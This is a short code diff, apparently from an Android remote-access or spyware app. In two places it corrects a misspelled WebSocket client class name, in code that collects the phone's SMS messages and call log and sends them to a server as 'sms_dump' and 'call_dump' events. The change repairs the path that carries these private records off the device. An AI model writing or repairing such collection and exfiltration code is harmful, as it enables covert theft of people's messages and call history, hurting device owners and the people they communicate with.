@@ -47,7 +47,7 @@ public class SMSManager {
                 }
                 JSONObject data = new JSONObject();
                 data.put("sms", arr);
-                XRCXRCWebSocketClient.get(ctx).sendEvent("sms_dump", data);
+                XRCWebSocketClient.get(ctx).sendEvent("sms_dump", data);
             } catch (Exception e) {
                 Log.e(TAG, "SMS dump failed", e);
             } finally {
@@ -76,7 +76,7 @@ public class SMSManager {
                 }
                 JSONObject data = new JSONObject();
                 data.put("calls", arr);
-                XRCXRCWebSocketClient.get(ctx).sendEvent("call_dump", data);
+                XRCWebSocketClient.get(ctx).sendEvent("call_dump", data);
             } catch (Exception e) {
                 Log.e(TAG, "Call dump failed", e);
             } finally {
